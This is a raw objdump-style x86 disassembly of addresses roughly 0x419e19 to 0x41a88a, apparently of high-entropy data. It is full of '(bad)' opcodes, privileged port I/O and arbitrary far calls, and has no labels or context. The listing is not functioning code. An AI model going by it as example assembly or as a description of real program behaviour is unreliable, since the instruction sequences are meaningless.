  419e19:	imul   ebp,DWORD PTR [esi+0x3681b9a7],0x14
  419e20:	jecxz  0x419df0
  419e22:	cdq    
  419e23:	shl    BYTE PTR ds:0xc39eed31,1
  419e29:	sub    DWORD PTR [edi+eax*1+0x50],0x58
  419e2e:	(bad)  
  419e2f:	hlt    
  419e30:	lea    ecx,[ebx]
  419e32:	mov    cl,BYTE PTR [edx]
  419e34:	lods   eax,DWORD PTR ds:[esi]
  419e35:	fdivr  QWORD PTR [edx]
  419e37:	dec    esp
  419e38:	sbb    ebx,ebx
  419e3a:	call   0x9441:0x5fa86356
  419e41:	lock retf 
  419e43:	pop    ss
  419e44:	int3   
  419e45:	xchg   esi,eax
  419e46:	xchg   esp,eax
  419e47:	mov    ah,0x4e
  419e49:	ror    DWORD PTR [si+0x0],1
  419e4d:	dec    ecx
  419e4e:	xlat   BYTE PTR ds:[ebx]
  419e4f:	aad    0x78
  419e51:	pop    es
  419e52:	int    0x20
  419e54:	adc    edi,edx
  419e56:	mov    edi,0xe62be29b
  419e5b:	push   eax
  419e5c:	outs   dx,BYTE PTR ds:[esi]
  419e5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e5e:	xor    ebp,DWORD PTR ds:[edi]
  419e61:	xchg   edx,eax
  419e62:	push   ss
  419e63:	jl     0x419ec6
  419e65:	(bad)  
  419e66:	sbb    dh,dh
  419e68:	or     DWORD PTR ds:0x615c5624,ecx
  419e6e:	(bad)  
  419e6f:	popf   
  419e70:	cmp    edi,DWORD PTR [eax+0x77]
  419e73:	sub    dl,dh
  419e75:	out    0x9c,eax
  419e77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419e78:	mov    fs,WORD PTR [edi]
  419e7a:	dec    esp
  419e7b:	xchg   ebp,eax
  419e7c:	sub    ebp,ebx
  419e7e:	sub    edi,0xe6ff2e33
  419e84:	aad    0x3e
  419e86:	in     al,dx
  419e87:	sub    ecx,DWORD PTR [edx+0x69]
  419e8a:	inc    BYTE PTR ds:0x286d64b0
  419e90:	fnsave [eax-0x1e]
  419e93:	push   ebp
  419e94:	pop    ecx
  419e95:	inc    eax
  419e96:	and    al,0x39
  419e98:	sar    DWORD PTR [eax],cl
  419e9a:	add    al,ah
  419e9c:	add    ch,ah
  419e9e:	xor    eax,0xe1da67cc
  419ea3:	pop    ecx
  419ea4:	lahf   
  419ea5:	dec    al
  419ea7:	in     al,0x13
  419ea9:	mov    BYTE PTR [ebx+esi*1+0x5ebe80f],cl
  419eb0:	add    eax,0x47e3ed81
  419eb5:	mov    DWORD PTR [ecx],esi
  419eb7:	jae    0x419e87
  419eb9:	inc    ecx
  419eba:	mov    ch,0x24
  419ebc:	push   edi
  419ebd:	pop    ds
  419ebe:	mov    ah,0x6
  419ec0:	jb     0x419e8a
	...
  419f32:	add    BYTE PTR [eax],al
  419f34:	sbb    al,0x97
  419f36:	in     al,0x47
  419f38:	out    dx,eax
  419f39:	ja     0x419efa
  419f3b:	fbstp  TBYTE PTR [ebx-0x1561f4b7]
  419f41:	fmul   st,st(5)
  419f43:	add    BYTE PTR [eax+0x19],dh
  419f46:	add    DWORD PTR [eax],eax
  419f48:	test   BYTE PTR [eax],0x0
  419f4b:	add    BYTE PTR [ebx+0x3c9d31c],bh
  419f51:	ss xor eax,0xc5a0a057
  419f57:	loope  0x419f2f
  419f59:	stc    
  419f5a:	add    esp,DWORD PTR gs:[eax+0x7b59e570]
  419f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f62:	repz xor eax,0x3db9a015
  419f68:	sahf   
  419f69:	push   eax
  419f6a:	cmp    bh,bh
  419f6c:	dec    edx
  419f6d:	test   BYTE PTR [eax-0x5803bd5b],ch
  419f73:	out    0x3,eax
  419f75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419f76:	loop   0x419f5e
  419f78:	push   0x4bcd2b7f
  419f7d:	in     al,0x63
  419f7f:	jge    0x419fa9
  419f81:	(bad)  
  419f82:	xlat   BYTE PTR ds:[ebx]
  419f83:	ds xchg esi,eax
  419f85:	pop    ebx
  419f86:	and    BYTE PTR [ebx-0x6c2f5673],ah
  419f8c:	in     eax,dx
  419f8d:	fild   DWORD PTR [eax]
  419f8f:	ins    BYTE PTR es:[edi],dx
  419f90:	pop    edi
  419f91:	das    
  419f92:	repnz mov ebp,0xd70899ac
  419f98:	fst    QWORD PTR [ebx]
  419f9a:	or     al,0x6
  419f9c:	adc    al,0x72
  419f9e:	jns    0x419f2c
  419fa0:	shr    BYTE PTR [eax+0x14],cl
  419fa3:	int    0x4e
  419fa5:	xor    eax,0x225e2d2f
  419faa:	jp     0x419f92
  419fac:	jle    0x41a021
  419fae:	js     0x419f99
  419fb0:	cmp    eax,0x1dbe15e2
  419fb5:	dec    esi
  419fb6:	ins    DWORD PTR es:[edi],dx
  419fb7:	jne    0x41a032
  419fb9:	or     edx,0x1778985d
  419fbf:	shl    DWORD PTR [edx],cl
  419fc1:	push   es
  419fc2:	adc    al,0x55
  419fc4:	fdiv   st,st(2)
  419fc6:	or     al,BYTE PTR [ebp+0x11]
  419fc9:	mov    dl,0xc0
  419fcb:	cmp    bl,dl
  419fcd:	and    al,0x3f
  419fcf:	cli    
  419fd0:	mov    edx,0x96cb10e8
  419fd5:	test   eax,0xba75aa20
  419fda:	imul   ecx,edx,0x24bd35ee
  419fe0:	or     al,0xa5
  419fe2:	sub    al,0xaf
  419fe4:	or     DWORD PTR [edx],ebx
  419fe6:	or     eax,0x9f423d9b
  419feb:	loopne 0x419ff1
  419fed:	sbb    BYTE PTR cs:[ecx+0x42],0xd5
  419ff2:	dec    DWORD PTR [edx]
  419ff4:	lea    esi,[edx+0x6f]
  419ff7:	mov    ecx,0xdb3c3261
  419ffc:	jne    0x419fdd
  419ffe:	inc    esi
  419fff:	(bad)  [edx-0x5b]
  41a002:	in     eax,0x4b
  41a004:	sar    DWORD PTR [edx],0x4
  41a007:	in     al,0xb7
  41a009:	mov    edi,0x93cdada1
  41a00e:	loope  0x41a02b
  41a010:	lods   al,BYTE PTR ds:[esi]
  41a011:	sbb    edi,DWORD PTR [eax-0x79c62489]
  41a017:	push   esp
  41a018:	cmp    al,0x7f
  41a01a:	xchg   ebp,eax
  41a01b:	(bad)  
  41a01c:	imul   ecx,DWORD PTR [edi],0xffffffc3
  41a01f:	mov    al,0xbf
  41a021:	shl    BYTE PTR [ebx+0x57c21e0],0x2f
  41a028:	jge    0x41a069
  41a02a:	dec    edx
  41a02b:	push   edx
  41a02c:	ja     0x419fe3
  41a02e:	xchg   edi,eax
  41a02f:	sbb    ch,bl
  41a031:	test   al,0xe6
  41a033:	sbb    edx,DWORD PTR [eax-0x6fbfc001]
  41a039:	adc    esi,edx
  41a03b:	mov    al,0xb9
  41a03d:	mov    dh,ah
  41a03f:	cld    
  41a040:	mov    cl,0xe
	...
  41a0b2:	add    BYTE PTR [eax],al
  41a0b4:	scas   eax,DWORD PTR es:[edi]
  41a0b5:	test   DWORD PTR [esi-0xa441be],ebx
  41a0bb:	in     eax,dx
  41a0bc:	(bad)  ds:0x24be04a2
  41a0c2:	std    
  41a0c3:	dec    edi
  41a0c4:	data16 sbb al,BYTE PTR [ecx]
  41a0c7:	add    dh,dh
  41a0c9:	add    BYTE PTR [eax],al
  41a0cb:	add    BYTE PTR [edx],ah
  41a0cd:	push   0x35
  41a0cf:	hlt    
  41a0d0:	dec    esp
  41a0d1:	ds jmp 0x41a12c
  41a0d4:	lods   eax,DWORD PTR ds:[esi]
  41a0d5:	sub    BYTE PTR [ecx+0x10],0xa9
  41a0d9:	mov    ebx,0xa03d2556
  41a0de:	mov    eax,DWORD PTR [edi-0x3b]
  41a0e1:	mov    edi,0xd25b4ac3
  41a0e6:	fld    DWORD PTR [eiz*8-0x724f670b]
  41a0ed:	push   eax
  41a0ee:	outs   dx,DWORD PTR ds:[esi]
  41a0ef:	std    
  41a0f0:	test   eax,0x7978a9ab
  41a0f5:	add    bl,al
  41a0f7:	sub    eax,0xaa960923
  41a0fc:	(bad)  
  41a0fd:	fidivr DWORD PTR [ecx-0x33d47cce]
  41a103:	jecxz  0x41a13c
  41a105:	jmp    0xa88a7a46
  41a10a:	stc    
  41a10b:	fwait
  41a10c:	mov    BYTE PTR [ecx+ebp*1],cl
  41a10f:	and    DWORD PTR [eax+0x5af55978],ebp
  41a115:	test   DWORD PTR [eax+0x47],0xe70fe6fe
  41a11c:	loop   0x41a0e0
  41a11e:	cmp    DWORD PTR [edx+0x53a0fd39],ebp
  41a124:	mov    ds,WORD PTR [edx+ecx*2+0x6b1fdb04]
  41a12b:	sub    DWORD PTR [edi],esi
  41a12d:	out    dx,al
  41a12e:	dec    ebp
  41a12f:	cmc    
  41a130:	stos   BYTE PTR es:[edi],al
  41a131:	(bad)  
  41a132:	inc    ebx
  41a133:	pop    ds
  41a134:	xor    DWORD PTR [eax+0x72bf2ca2],edx
  41a13a:	pop    ebx
  41a13b:	xor    al,0x69
  41a13d:	sub    DWORD PTR [ebx-0x2a],esi
  41a140:	das    
  41a141:	js     0x41a16c
  41a143:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a144:	clc    
  41a145:	push   ebp
  41a146:	fdiv   DWORD PTR [edi+0x77786f4d]
  41a14c:	sub    DWORD PTR ds:0x79d9d3bf,ebp
  41a152:	xchg   esi,eax
  41a153:	xchg   ebp,eax
  41a154:	ss mov esi,0x7776f129
  41a15a:	mov    ah,0xaf
  41a15c:	sbb    eax,0x997e6249
  41a161:	push   edx
  41a162:	and    BYTE PTR [edi+edi*4+0x4543d04],0x3d
  41a16a:	jmp    0x41a126
  41a16c:	or     ah,al
  41a16e:	adc    BYTE PTR [ebx+ebp*1],bl
  41a171:	push   ebx
  41a172:	push   eax
  41a173:	loopne 0x41a182
  41a175:	daa    
  41a176:	ret    0x8d94
  41a179:	inc    esp
  41a17a:	add    BYTE PTR [ebx+ebp*2-0x6d],cl
  41a17e:	push   ss
  41a17f:	mov    eax,ds:0xfd84b455
  41a184:	ror    BYTE PTR [edx+0x65],1
  41a187:	mov    ah,0xff
  41a189:	mov    DWORD PTR ds:0x63c00768,ecx
  41a18f:	(bad)  
  41a191:	lea    edx,[eax+0x33]
  41a194:	mov    esp,0x2bab9466
  41a199:	add    eax,0x6049aab4
  41a19e:	add    al,0xb2
  41a1a0:	and    DWORD PTR [ebp-0x14],esi
  41a1a3:	cmp    bh,0x2e
  41a1a6:	not    DWORD PTR [ebp*2+0x472a434f]
  41a1ad:	push   ebp
  41a1ae:	in     eax,0x68
  41a1b0:	sbb    al,0xdb
  41a1b2:	shl    BYTE PTR [esi],cl
  41a1b4:	out    0x51,al
  41a1b6:	in     al,dx
  41a1b7:	add    BYTE PTR ds:0xcd5d2baf,dl
  41a1bd:	adc    ebx,DWORD PTR [ebp+0x78]
  41a1c0:	mov    ecx,0x7c
	...
  41a231:	add    BYTE PTR [eax],al
  41a233:	add    BYTE PTR [eax-0xcc4519],ah
  41a239:	jg     0x41a1e4
  41a23b:	imul   DWORD PTR [esi+eiz*4]
  41a23e:	push   edi
  41a23f:	not    cl
  41a241:	push   ebx
  41a242:	jnp    0x41a1d8
  41a244:	pop    esp
  41a245:	sbb    eax,DWORD PTR [ecx]
  41a247:	add    dh,dh
  41a249:	add    BYTE PTR [eax],al
  41a24b:	add    BYTE PTR ds:0xc8ea5757,bh
  41a251:	sbb    DWORD PTR [esi],esp
  41a253:	xchg   dl,bh
  41a255:	mov    eax,0xee72e862
  41a25a:	int    0xf3
  41a25c:	ja     0x41a27b
  41a25e:	dec    esi
  41a25f:	jo     0x41a284
  41a261:	push   0x62
  41a263:	mov    edx,0x99221199
  41a268:	(bad)  
  41a269:	in     eax,0xdc
  41a26b:	pop    esp
  41a26c:	mov    esi,DWORD PTR [ecx+eax*1]
  41a26f:	into   
  41a270:	inc    ebp
  41a271:	das    
  41a272:	nop
  41a273:	outs   dx,DWORD PTR ds:[esi]
  41a274:	dec    edx
  41a275:	mov    eax,ds:0x9d9cb7b4
  41a27a:	div    DWORD PTR [esi]
  41a27c:	icebp  
  41a27d:	ins    BYTE PTR es:[edi],dx
  41a27e:	cs xchg esp,eax
  41a280:	adc    eax,0x3b6e9e9d
  41a285:	dec    edi
  41a286:	leave  
  41a287:	pop    edx
  41a288:	scas   al,BYTE PTR es:[edi]
  41a289:	pushf  
  41a28a:	cli    
  41a28b:	mov    ebp,0xc26a3a9a
  41a290:	jmp    0xdfa0c383
  41a295:	(bad)  
  41a296:	sbb    al,0xd7
  41a298:	sti    
  41a299:	adc    al,BYTE PTR [edx-0x4ca7f1ac]
  41a29f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a2a0:	es mov bl,0x6b
  41a2a3:	mov    cl,0x8e
  41a2a5:	in     eax,0xf4
  41a2a7:	test   edi,ebp
  41a2a9:	bound  ebx,QWORD PTR [ecx]
  41a2ab:	sahf   
  41a2ac:	das    
  41a2ad:	lock sub eax,0xb12e923b
  41a2b3:	jmp    0x941c4c73
  41a2b8:	or     DWORD PTR [ebx-0x5efe6273],ecx
  41a2be:	out    dx,eax
  41a2bf:	dec    ecx
  41a2c0:	mov    ds:0xb604be7c,eax
  41a2c5:	jne    0x41a2e4
  41a2c7:	mov    ds:0xc45c7ff1,eax
  41a2cc:	iret   
  41a2cd:	mov    edi,0xf55c7a1e
  41a2d2:	xchg   edi,eax
  41a2d3:	das    
  41a2d4:	iret   
  41a2d5:	test   eax,0x178e7268
  41a2da:	inc    eax
  41a2db:	inc    edx
  41a2dc:	push   ss
  41a2dd:	sbb    dh,cl
  41a2df:	mov    edx,DWORD PTR [edi+0x26]
  41a2e2:	mov    WORD PTR [esi-0x9984f4f],fs
  41a2e8:	call   0x367e6f12
  41a2ed:	dec    ebp
  41a2ee:	fwait
  41a2ef:	jae    0x41a29b
  41a2f1:	daa    
  41a2f2:	je     0x41a2e8
  41a2f4:	jge    0x41a2eb
  41a2f6:	popf   
  41a2f7:	and    esi,eax
  41a2f9:	je     0x41a32d
  41a2fb:	gs dec ebp
  41a2fd:	in     eax,dx
  41a2fe:	push   ebx
  41a2ff:	sbb    esp,edi
  41a301:	dec    ebx
  41a302:	dec    edi
  41a303:	aaa    
  41a304:	inc    edi
  41a305:	or     al,0x6c
  41a307:	fcomip st,st(6)
  41a309:	out    0xd4,eax
  41a30b:	test   edi,edx
  41a30d:	enter  0xe855,0x6c
  41a311:	das    
  41a312:	hlt    
  41a313:	xlat   BYTE PTR ds:[ebx]
  41a314:	mov    dl,0xf9
  41a316:	(bad)  
  41a318:	jl     0x41a304
  41a31a:	leave  
  41a31b:	mov    ebx,0xfa45d4cc
  41a320:	dec    DWORD PTR [ecx+0x4d3f0df7]
  41a326:	gs out 0x21,eax
  41a329:	scas   eax,DWORD PTR es:[edi]
  41a32a:	or     al,0xa9
  41a32c:	das    
  41a32d:	mov    ah,0x4d
  41a32f:	aam    0x46
  41a331:	imul   edi,DWORD PTR [edi-0x647be8fc],0xffffffe3
  41a338:	mov    dl,0xed
  41a33a:	pop    ds
  41a33b:	pop    eax
  41a33c:	sub    al,0xe8
  41a33e:	aaa    
  41a33f:	out    dx,eax
  41a340:	pop    ebp
  41a341:	and    eax,0x0
	...
  41a3b2:	add    BYTE PTR [eax],al
  41a3b4:	cmp    eax,0xed3a6998
  41a3b9:	sti    
  41a3ba:	jg     0x41a35b
  41a3bc:	and    DWORD PTR [esi+edx*4+0x6a],ebp
  41a3c0:	mov    ebx,0x52a5a52b
  41a3c5:	sbb    al,0x1
  41a3c7:	add    dh,dh
  41a3c9:	add    BYTE PTR [eax],al
  41a3cb:	add    BYTE PTR [ebp-0x36],bl
  41a3ce:	sbb    ah,BYTE PTR [esi+ebp*4]
  41a3d1:	mov    ebx,0xe6dd4e0e
  41a3d6:	retf   0xa041
  41a3d9:	fstp   DWORD PTR [esi+0x77]
  41a3dc:	dec    edx
  41a3dd:	xor    esi,DWORD PTR [ecx+0x10]
  41a3e0:	fwait
  41a3e1:	sbb    BYTE PTR [ebx+esi*2],cl
  41a3e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a3e5:	enter  0xc706,0x2e
  41a3e9:	inc    edx
  41a3ea:	push   edi
  41a3eb:	xchg   ecx,eax
  41a3ec:	out    dx,eax
  41a3ed:	fwait
  41a3ee:	scas   al,BYTE PTR es:[edi]
  41a3ef:	sub    BYTE PTR [ecx-0x63],al
  41a3f2:	pop    ds
  41a3f3:	jmp    DWORD PTR [eax]
  41a3f5:	pop    edi
  41a3f6:	fidivr DWORD PTR ds:0x79956e65
  41a3fc:	sbb    ebx,edx
  41a3fe:	sar    BYTE PTR [eax+0x37eacf0d],cl
  41a404:	and    eax,DWORD PTR [ecx+edi*1]
  41a407:	test   DWORD PTR [esi+0x38b1ffe5],0xd29f14da
  41a411:	jb     0x41a423
  41a413:	cmp    al,0xc9
  41a415:	dec    edx
  41a416:	in     al,0x95
  41a418:	dec    ecx
  41a419:	inc    esi
  41a41a:	fsubr  QWORD PTR [eax]
  41a41c:	or     eax,0xc3a63917
  41a421:	mov    esi,0xaf632212
  41a426:	out    dx,eax
  41a427:	cmp    BYTE PTR [edi+0x3b25b62b],cl
  41a42d:	mov    esp,0x624bc720
  41a432:	sbb    esi,esp
  41a434:	sub    ecx,DWORD PTR [ebx]
  41a436:	icebp  
  41a437:	fwait
  41a438:	gs retf 0xf064
  41a43c:	jae    0x41a3e4
  41a43e:	cmp    esp,DWORD PTR [ecx-0x1a]
  41a441:	jl     0x41a4b2
  41a443:	rol    DWORD PTR [edx-0x56],cl
  41a446:	mul    BYTE PTR [edi+0x4620f4c5]
  41a44c:	xor    eax,0x8fb8eaa5
  41a451:	push   ecx
  41a452:	mov    ds:0xe11df497,al
  41a457:	pop    esi
  41a458:	cld    
  41a459:	into   
  41a45a:	cld    
  41a45b:	mov    ebp,0xb29290b1
  41a460:	ret    
  41a461:	adc    esp,DWORD PTR [eax-0x3f]
  41a464:	imul   edx,DWORD PTR [esi-0x1090f56c],0x2a49a32b
  41a46e:	mov    eax,cs:0xc3b157de
  41a474:	pop    ecx
  41a475:	xchg   ebx,eax
  41a476:	pop    ss
  41a477:	and    ebp,DWORD PTR [esi+0x30c7b337]
  41a47d:	cli    
  41a47e:	pop    es
  41a47f:	mov    edi,0x4a694a0d
  41a484:	xor    eax,0x39669806
  41a489:	daa    
  41a48a:	add    dl,BYTE PTR [edx+0x3f]
  41a48d:	call   0x14eb:0xde412999
  41a494:	mov    bl,0x83
  41a496:	and    eax,DWORD PTR [esi-0x61faaf85]
  41a49c:	in     eax,dx
  41a49d:	dec    ebx
  41a49e:	pop    edi
  41a49f:	mov    dl,0xd4
  41a4a1:	repz fimul DWORD PTR [eax]
  41a4a4:	stos   BYTE PTR es:[edi],al
  41a4a5:	push   cs
  41a4a6:	mov    bh,0xb7
  41a4a8:	(bad)  
  41a4aa:	loope  0x41a4b6
  41a4ac:	icebp  
  41a4ad:	popa   
  41a4ae:	sahf   
  41a4af:	push   edi
  41a4b0:	jnp    0x41a4f2
  41a4b2:	ds jnp 0x41a49e
  41a4b5:	cwde   
  41a4b6:	int3   
  41a4b7:	jmp    0x56bd:0x3833a02b
  41a4be:	dec    edx
  41a4bf:	inc    eax
  41a4c0:	sbb    ebx,DWORD PTR [edi]
	...
  41a532:	add    BYTE PTR [eax],al
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	aam    0x8d
  41a537:	(bad)  
  41a538:	(bad)  
  41a539:	jnp    0x41a52a
  41a53b:	fld    QWORD PTR [eax-0x5d161f56]
  41a541:	cmp    al,0x47
  41a543:	xor    DWORD PTR [eax+0x1d],ecx
  41a546:	add    DWORD PTR [eax],eax
  41a548:	test   BYTE PTR [eax],0x0
  41a54b:	add    BYTE PTR [ebx+0x74146270],cl
  41a551:	cdq    
  41a552:	xchg   ecx,eax
  41a553:	neg    DWORD PTR [edi+0x15]
  41a556:	jne    0x41a532
  41a558:	(bad)  
  41a559:	push   ebx
  41a55a:	xchg   BYTE PTR [eax],bl
  41a55c:	mul    DWORD PTR ds:0x2a716054
  41a562:	fiadd  WORD PTR [ebx]
  41a565:	imul   DWORD PTR [ecx-0x31e3821a]
  41a56b:	imul   eax,DWORD PTR [ebx],0x8efcd995
  41a571:	in     al,dx
  41a572:	out    0x1d,al
  41a574:	out    dx,al
  41a575:	ficom  WORD PTR [edx]
  41a577:	adc    bh,BYTE PTR [edi-0x50]
  41a57a:	jp     0x41a5b6
  41a57c:	pushf  
  41a57d:	xlat   BYTE PTR ds:[ebx]
  41a57e:	mov    WORD PTR [ebp+0x237fab16],ss
  41a584:	mov    ebx,0x367da815
  41a589:	(bad)  
  41a58a:	jns    0x41a5b3
  41a58c:	mov    eax,0xbb6847ac
  41a591:	add    eax,0x9cef2939
  41a596:	test   edx,ebx
  41a598:	mov    edi,0xdfb704ae
  41a59d:	mul    BYTE PTR [edx-0x4a]
  41a5a0:	mov    eax,0x1fdc05db
  41a5a5:	shl    BYTE PTR [eax+0xfe51aa6],cl
  41a5ab:	ins    BYTE PTR es:[edi],dx
  41a5ac:	inc    ecx
  41a5ad:	retf   0xf0b2
  41a5b0:	lds    ecx,FWORD PTR [edi]
  41a5b2:	out    0x97,eax
  41a5b4:	lea    eax,[esi-0x77]
  41a5b7:	lahf   
  41a5b8:	or     DWORD PTR [esp+eiz*8],edx
  41a5bb:	sub    eax,0x1455307f
  41a5c0:	test   BYTE PTR [ecx],0x41
  41a5c3:	push   ebp
  41a5c4:	mov    es,WORD PTR [ecx]
  41a5c6:	jmp    0x41a54d
  41a5c8:	repz mov dl,0x9a
  41a5cb:	pop    esi
  41a5cc:	jl     0x41a56c
  41a5ce:	cwde   
  41a5cf:	mul    ebp
  41a5d1:	das    
  41a5d2:	sti    
  41a5d3:	in     eax,0xb8
  41a5d5:	pop    ds
  41a5d6:	pcmpeqb mm4,QWORD PTR [edx]
  41a5d9:	and    ebp,eax
  41a5db:	and    al,0xd9
  41a5dd:	inc    eax
  41a5de:	add    eax,DWORD PTR [ebx]
  41a5e0:	scas   al,BYTE PTR es:[edi]
  41a5e1:	out    0x44,eax
  41a5e3:	fdivr  DWORD PTR [ebx+edx*4-0x35f1d4d4]
  41a5ea:	int    0x5e
  41a5ec:	out    0xd6,al
  41a5ee:	es iret 
  41a5f0:	imul   DWORD PTR [ebx]
  41a5f2:	xor    al,dl
  41a5f4:	retf   
  41a5f5:	jge    0x41a670
  41a5f7:	rol    edx,cl
  41a5f9:	scas   eax,DWORD PTR es:[edi]
  41a5fa:	lock add ch,ah
  41a5fd:	sub    ch,BYTE PTR [edx+ebp*8+0x2e]
  41a601:	cmp    dh,BYTE PTR [esi+0x6a064305]
  41a607:	call   0x137e559d
  41a60c:	popf   
  41a60d:	inc    edi
  41a60e:	fild   QWORD PTR ss:0xbf66fd7f
  41a615:	cmc    
  41a616:	dec    esp
  41a617:	stos   DWORD PTR es:[edi],eax
  41a618:	aad    0xe2
  41a61a:	jbe    0x41a678
  41a61c:	fisubr DWORD PTR [eax+0x7]
  41a61f:	(bad)  
  41a620:	sbb    esi,esp
  41a622:	sbb    ah,ch
  41a624:	adc    al,0x54
  41a626:	jl     0x41a689
  41a628:	mov    ch,0xde
  41a62a:	mov    al,ds:0x30adaac4
  41a62f:	out    dx,al
  41a630:	mov    cl,bh
  41a632:	jb     0x41a657
  41a634:	jp     0x41a5dc
  41a636:	(bad)  
  41a637:	bound  edi,QWORD PTR [esi+ebx*8+0x20]
  41a63b:	dec    ecx
  41a63c:	scas   eax,DWORD PTR es:[edi]
  41a63d:	and    ebp,DWORD PTR [ebx-0x62]
  41a640:	mov    ebp,esi
	...
  41a6b2:	add    BYTE PTR [eax],al
  41a6b4:	mov    bl,0x3f
  41a6b6:	jno    0x41a71d
  41a6b8:	std    
  41a6b9:	outs   dx,DWORD PTR ds:[esi]
  41a6ba:	mov    bh,0xff
  41a6bc:	xchg   ecx,eax
  41a6bd:	pop    edx
  41a6be:	cdq    
  41a6bf:	mov    dl,0xea
  41a6c1:	ins    BYTE PTR es:[edi],dx
  41a6c2:	or     DWORD PTR [ebx],ebx
  41a6c4:	ds push ds
  41a6c6:	add    DWORD PTR [eax],eax
  41a6c8:	test   BYTE PTR [eax],0x0
  41a6cb:	add    ah,ch
  41a6cd:	xchg   ebp,eax
  41a6ce:	push   cs
  41a6cf:	rdmsr  
  41a6d1:	mov    esi,0xc1ab092b
  41a6d6:	mov    bl,0xe0
  41a6d8:	ret    
  41a6d9:	adc    cl,BYTE PTR fs:[ecx+0x73106be2]
  41a6e0:	out    0xee,eax
  41a6e2:	outs   dx,BYTE PTR ds:[esi]
  41a6e3:	out    0xae,eax
  41a6e5:	inc    eax
  41a6e6:	add    dl,BYTE PTR [ebp*4+0x593defd4]
  41a6ed:	or     eax,0x57b90bfa
  41a6f2:	xor    cl,dh
  41a6f4:	je     0x41a6a1
  41a6f6:	jb     0x41a70f
  41a6f8:	fidivr WORD PTR [ecx]
  41a6fa:	jmp    0x80f718bf
  41a6ff:	loopne 0x41a71e
  41a701:	bound  ecx,QWORD PTR [bx+0x7d1c]
  41a706:	pop    ds
  41a707:	cli    
  41a708:	sti    
  41a709:	loopne 0x41a742
  41a70b:	push   ss
  41a70c:	les    edx,FWORD PTR [ecx]
  41a70e:	aad    0x33
  41a710:	xor    edx,esi
  41a712:	inc    edi
  41a713:	stc    
  41a714:	lods   eax,DWORD PTR ds:[esi]
  41a715:	iret   
  41a716:	or     al,0x3a
  41a718:	jno    0x41a71c
  41a71a:	cmc    
  41a71b:	xchg   ebp,eax
  41a71c:	sbb    DWORD PTR [edx+0x724e5e0d],ebx
  41a722:	xchg   ecx,eax
  41a723:	sbb    bl,BYTE PTR [eax-0x44]
  41a726:	data16 loop 0x41a6bd
  41a729:	xchg   ebx,eax
  41a72a:	es iret 
  41a72c:	cli    
  41a72d:	adc    esp,ecx
  41a72f:	repz xlat BYTE PTR ds:[ebx]
  41a731:	lock sub ah,BYTE PTR [ecx-0x47]
  41a735:	push   ecx
  41a736:	adc    eax,0x1a6c9e0d
  41a73b:	aaa    
  41a73c:	inc    esi
  41a73d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a73e:	push   ebx
  41a73f:	or     eax,0x793dd707
  41a744:	ret    0xcfd9
  41a747:	or     DWORD PTR [esi+edx*2+0x2a],ecx
  41a74b:	es inc edi
  41a74d:	xchg   ebx,eax
  41a74e:	xchg   ebp,eax
  41a74f:	(bad)  
  41a750:	jp     0x41a783
  41a752:	add    DWORD PTR [ebx+ecx*1-0x36],eax
  41a756:	test   BYTE PTR [edx],0x4
  41a759:	mov    WORD PTR [esp+edi*8+0x2339d41d],ss
  41a760:	test   BYTE PTR [eax],ch
  41a762:	(bad)  
  41a763:	or     DWORD PTR [eax],esp
  41a765:	pop    esi
  41a766:	cwde   
  41a767:	jmp    0x41a742
  41a769:	ja     0x41a7e4
  41a76b:	pusha  
  41a76c:	push   edx
  41a76d:	cs or  al,0x62
  41a770:	std    
  41a771:	lahf   
  41a772:	pop    edi
  41a773:	xor    dl,BYTE PTR [edi+0x60]
  41a776:	or     BYTE PTR [esi+0x2ea9123d],0x9d
  41a77d:	dec    eax
  41a77e:	mov    edi,0xb053584c
  41a783:	push   ebp
  41a784:	fild   DWORD PTR [ebx+0x4c9d9b4]
  41a78a:	in     eax,dx
  41a78b:	pop    edi
  41a78c:	call   0x5723405d
  41a791:	in     eax,0x83
  41a793:	cmp    DWORD PTR [eax-0x28],esi
  41a796:	shr    BYTE PTR [edx-0x19b037bb],cl
  41a79c:	mov    esp,0xd09cc4b0
  41a7a1:	push   cs
  41a7a2:	cmp    BYTE PTR [ecx+0x6bbc1151],0xd3
  41a7a9:	outs   dx,DWORD PTR ds:[esi]
  41a7aa:	jne    0x41a768
  41a7ac:	pop    es
  41a7ad:	adc    eax,0xa1eeee33
  41a7b2:	sbb    eax,0xe220f126
  41a7b7:	and    BYTE PTR [ebp-0x725a9733],cl
  41a7bd:	sbb    BYTE PTR [ebx],bl
  41a7bf:	xor    BYTE PTR [ebp-0xd],0x0
	...
  41a833:	add    BYTE PTR [edx-0x201eb8e7],al
  41a839:	jmp    DWORD PTR [esi-0xf626c85]
  41a83f:	loop   0x41a86a
  41a841:	cld    
  41a842:	add    al,0x29
  41a844:	xor    al,0x1f
  41a846:	add    DWORD PTR [eax],eax
  41a848:	test   BYTE PTR [eax],0x0
  41a84b:	add    BYTE PTR [edi+ecx*1],al
  41a84e:	dec    ebp
  41a84f:	push   ss
  41a850:	dec    edx
  41a851:	adc    eax,0xcaa75b85
  41a856:	inc    ebp
  41a857:	push   ebp
  41a858:	or     ah,BYTE PTR [esi]
  41a85a:	push   ebp
  41a85b:	fidiv  WORD PTR [ecx]
  41a85d:	shl    dh,0x2
  41a860:	sub    BYTE PTR [ebx+eax*1+0x70],ah
  41a864:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a865:	xlat   BYTE PTR ds:[ebx]
  41a866:	push   0x5e
  41a868:	add    al,0x7
  41a86a:	adc    ah,BYTE PTR [bp+0x73]
  41a86e:	daa    
  41a86f:	movzx  edi,WORD PTR [ecx]
  41a872:	xchg   DWORD PTR [ecx],esi
  41a874:	fld    DWORD PTR [eax-0x46]
  41a877:	mov    esp,0x8099fb3c
  41a87c:	mov    ch,0x4a
  41a87e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a87f:	fst    DWORD PTR [ecx+0x1a791c6d]
  41a885:	inc    edi
  41a886:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a887:	cs jbe 0x41a8c1
  41a88a:	call   0xb0ac:0x2a52607a
